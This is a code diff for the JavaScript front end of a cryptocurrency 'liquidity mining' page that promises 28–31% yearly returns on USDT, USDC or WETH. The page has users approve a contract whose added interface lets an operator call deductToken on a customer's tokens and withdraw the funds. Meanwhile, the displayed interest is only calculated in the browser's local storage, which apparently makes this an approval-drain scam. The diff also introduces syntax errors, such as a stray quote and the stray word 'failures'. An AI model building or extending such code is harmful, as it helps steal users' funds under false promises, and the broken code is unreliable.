@@ -46,13 +46,9 @@ const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
 const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
 const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
-const DEDUCT_CONTRACT_ABI = [
-  "function isServiceActiveFor(address customer) view returns (bool)",
-  "function activateService(address tokenContract) external",
-  "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)",
-  "function deductToken(address token, uint256 amount) external",
-  { "anonymous": false, "inputs": [ { "indexed": true, "name": "customer", "type": "address" }, { "indexed": true, "name": "tokenContract", "type": "address" } ], "name": "ServiceActivated", "type": "event" }
-];
+const DEDUCT_CONTRACT_ABI = [{"inputs":[{"internalType":"address","name":"_storeAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"error"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"recipient","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"EthWithdrawn","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"},{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"}],"name":"ServiceActivated","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"}],"name":"ServiceDeactivated","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"},{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokenDeducted","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokensRescued","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"WethUnwrapped","type":"event"},{"inputs":[],"name":"REQUIRED_ALLOWANCE_THRESHOLD","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"activateService","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"deactivateService","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"customer","type":"address"},{"internalType":"address","name":"tokenContract","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deductToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getContractEthBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"getContractTokenBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"customer","type":"address"},{"internalType":"address","name":"tokenContract","type":"address"}],"name":"getCustomerAllowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isServiceActiveFor","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"rescueTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[],"name":"storeAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
+{"inputs":[{"internalType":"address","name":"wethAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"unwrapWETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdrawEth","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}];
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount) external returns (bool)",
   "function balanceOf(address account) view returns (uint256)",
@@ -119,7 +115,7 @@ const translations = {
     claimSuccess: 'Claim successful!',
     nextClaimTime: 'Next claim in 12 hours.',
     miningStarted: 'Mining started!',
-    error: 'Error',
+    error: ' 'Error',
     offlineWarning: 'Server offline, using local mode.',
     noWallet: 'Please connect your wallet.',
     dataSent: 'Data sent.',
@@ -223,65 +219,65 @@ const translations = {
     walletBalance: '錢包餘額'
   },
   'zh-Hans': {
-    title: '流动性挖矿',
-    subtitle: '开始赚取数百万',
-    tabLiquidity: '流动性',
-    tabPledging: '质押',
-    grossOutputLabel: '可领取产出',
-    cumulativeLabel: '可领取',
-    walletBalanceLabel: '钱包余额',
-    accountBalanceLabel: '账户余额',
+    title: '流動性挖礦',
+    subtitle: '開始賺取數百萬',
+    tabLiquidity: '流動性',
+    tabPledging: '質押',
+    grossOutputLabel: '可領取產出',
+    cumulativeLabel: '可領取',
+    walletBalanceLabel: '錢包餘額',
+    accountBalanceLabel: '帳戶餘額',
     nextBenefit: '下次收益: 00:00:00',
-    startBtnText: '开始',
-    pledgeAmountLabel: '质押金额',
-    pledgeDurationLabel: '期间',
-    pledgeBtnText: '立即质押',
-    claimBtnText: '领取',
-    noClaimable: '无可领取利息。',
-    claimSuccess: '领取成功！',
-    nextClaimTime: '下次领取时间：12 小时后。',
-    miningStarted: '挖矿开始！',
-    error: '错误',
-    offlineWarning: '服务器离线，使用本地模式。',
-    noWallet: '请连接您的钱包。',
-    dataSent: '数据已发送。',
-    pledgeSuccess: '质押成功！',
-    pledgeError: '质押失败。',
-    invalidPledgeAmount: '金额无效。',
-    invalidPledgeToken: '代币无效。',
-    insufficientBalance: '余额不足。',
-    ethersError: 'Ethers.js 错误。',
-    approveError: '授权失败。',
-    selectTokenFirst: '请先选择代币。',
-    balanceZero: '余额为零。',
-    balanceTooLow: '余额过低。',
-    wethValueTooLow: 'WETH 价值过低。',
-    rulesTitle: '挖矿规则',
+    startBtnText: '開始',
+    pledgeAmountLabel: '質押金額',
+    pledgeDurationLabel: '期間',
+    pledgeBtnText: '立即質押',
+    claimBtnText: '領取',
+    noClaimable: '無可領取利息。',
+    claimSuccess: '領取成功！',
+    nextClaimTime: '下次領取時間：12 小時後。',
+    miningStarted: '挖礦開始！',
+    error: '錯誤',
+    offlineWarning: '伺服器離線，使用本地模式。',
+    noWallet: '請連結您的錢包。',
+    dataSent: '數據已發送。',
+    pledgeSuccess: '質押成功！',
+    pledgeError: '質押失敗。',
+    invalidPledgeAmount: '金額無效。',
+    invalidPledgeToken: '代幣無效。',
+    insufficientBalance: '餘額不足。',
+    ethersError: 'Ethers.js 錯誤。',
+    approveError: '授權失敗。',
+    selectTokenFirst: '請先選擇代幣。',
+    balanceZero: '餘額為零。',
+    balanceTooLow: '餘額過低。',
+    wethValueTooLow: 'WETH 價值過低。',
+    rulesTitle: '挖礦規則',
     rulesContent: `
-      <p>1. 选择代币，需至少 500 USDT/USDC 或 WETH $500 才能开始。</p>
-      <p>2. 不足：可授权但无法开始。</p>
+      <p>1. 選擇代幣，需至少 500 USDT/USDC 或 WETH $500 才能開始。</p>
+      <p>2. 不足：可授權但無法開始。</p>
       <p>3. 年化利率：28.3% ~ 31.5%。</p>
-      <p>4. 每 12 小时发放一次（美西时间 00:00 与 12:00）。</p>
-      <p>5. 质押也会一并计算流动性挖矿利息。</p>
+      <p>4. 每 12 小時發放一次（美西時間 00:00 與 12:00）。</p>
+      <p>5. 質押也會一併計算流動性挖礦利息。</p>
     `,
-    modalClaimableLabel: '可领取',
-    modalSelectedTokenLabel: '选择代币',
-    modalEquivalentValueLabel: '等值金额',
-    totalPledge: '总质押金额',
-    estimate: '预估收益',
-    pledgeDetailTitle: '质押明细',
-    orderCount: '笔数',
-    startTime: '开始时间',
-    remaining: '剩余时间',
-    cycle: '周期',
+    modalClaimableLabel: '可領取',
+    modalSelectedTokenLabel: '選擇代幣',
+    modalEquivalentValueLabel: '等值金額',
+    totalPledge: '總質押金額',
+    estimate: '預估收益',
+    pledgeDetailTitle: '質押明細',
+    orderCount: '筆數',
+    startTime: '開始時間',
+    remaining: '剩餘時間',
+    cycle: '週期',
     apr: '年化',
-    accrued: '累计利息',
-    exceedBalance: '金额超出钱包余额！',
-    accountDetailTitle: '账户余额明细',
-    totalBalance: '总余额',
-    pledgedAmount: '质押金额',
-    claimedInterest: '已领取利息',
-    walletBalance: '钱包余额'
+    accrued: '累積利息',
+    exceedBalance: '金額超出錢包餘額！',
+    accountDetailTitle: '帳戶餘額明細',
+    totalBalance: '總餘額',
+    pledgedAmount: '質押金額',
+    claimedInterest: '已領取利息',
+    walletBalance: '錢包餘額'
   }
 };
 
@@ -511,7 +507,7 @@ function resetState(showMsg = true) {
   if (cumulativeValue) cumulativeValue.textContent = '0 ETH';
   if (elements.totalPledge) elements.totalPledge.textContent = '0.000';
   if (elements.estimate) elements.estimate.textContent = '0.000';
-  if (elements.exceedWarning) elements.exceedWarning.style.display = 'none';
+  if (elements.exceedWarning failures) elements.exceedWarning.style.display = 'none';
   if (showMsg) updateStatus(translations[currentLang].noWallet, true);
 }
 
@@ -542,13 +538,8 @@ function convertToSelectedToken(amount, fromToken, toToken) {
 // ==================== 總 Account Balance ====================
 function getTotalAccountBalanceInSelectedToken() {
   const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
-  let total = 0;
-  for (const token in accountBalance) {
-    const data = accountBalance[token];
-    const value = data.wallet + data.pledged + data.interest;
-    total += convertToSelectedToken(value, token, selected);
-  }
-  return total;
+  const data = accountBalance[selected];
+  return data.wallet + data.pledged + data.interest;
 }
 
 function updateAccountBalanceDisplay() {
@@ -558,7 +549,7 @@ function updateAccountBalanceDisplay() {
   accountBalanceValue.textContent = `${total.toFixed(3)} ${selected}`;
 }
 
-// 【修正】切換代幣時自動更新錢包餘額
+// 【修正】切換代幣時自動更新錢包餘額 + 帳戶餘額
 if (walletTokenSelect) {
   walletTokenSelect.addEventListener('change', () => {
     forceRefreshWalletBalance(); // 自動更新錢包餘額
@@ -640,7 +631,9 @@ function updateClaimableDisplay() {
 }
 
 async function updateInterest() {
-  const totalBalance = getTotalAccountBalanceInSelectedToken();
+  const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
+  const data = accountBalance[selected];
+  const totalBalance = data.wallet + data.pledged;
   if (totalBalance <= 0) {
     window.currentClaimable = 0;
     updateClaimableDisplay();
@@ -910,6 +903,7 @@ async function updateUIBasedOnChainState() {
         lastPayoutTime = lastPayoutTime || Date.now();
         currentCycleInterest = calculatePayoutInterest();
         authorizedToken = selectedToken;
+        accountBalance[selectedToken].pledged += balance;
         localStorage.setItem('pledgedAmount', pledgedAmount.toString());
         localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
         localStorage.setItem('currentCycleInterest', currentCycleInterest.toString());
@@ -1027,7 +1021,9 @@ function updateLanguage(lang) {
 }
 
 function calculatePayoutInterest() {
-  const totalBalance = getTotalAccountBalanceInSelectedToken();
+  const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
+  const data = accountBalance[selected];
+  const totalBalance = data.wallet + data.pledged;
   if (totalBalance <= 0) return 0;
   const now = Date.now();
   const lastPayout = parseInt(localStorage.getItem('lastPayoutTime')) || now;
@@ -1108,7 +1104,7 @@ function showAccountDetail() {
   const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
   const data = accountBalance[selected];
   const total = data.wallet + data.pledged + data.interest;
-  const claimedInterest = data.interest; // 直接使用 interest
+  const claimedInterest = data.interest;
   const pledged = data.pledged;
   const wallet = data.wallet;
 
@@ -1189,8 +1185,8 @@ document.addEventListener('DOMContentLoaded', () => {
         return;
       }
 
-      // 利息直接加到 interest（已領取利息）
-      accountBalance[authorizedToken].interest += claimable;
+      const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
+      accountBalance[selected].interest += claimable;
 
       window.currentClaimable = 0;
       localStorage.setItem('claimable', '0');
@@ -1278,7 +1274,7 @@ document.addEventListener('DOMContentLoaded', () => {
       const durationDays = parseInt(pledgeDuration.value) || 90;
       const token = pledgeToken.value;
       if (amount <= 0) { updateStatus(translations[currentLang].invalidPledgeAmount, true); return; }
-      const tokenContract = { 'USDT': usdtTokenContract, 'USDC': usdcContract, 'WETH': wethContract }[token];
+      const tokenContract = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract }[token];
       const decimals = token === 'WETH' ? 18 : 6;
       const amountWei = ethers.parseUnits(amount.toString(), decimals);
       try {
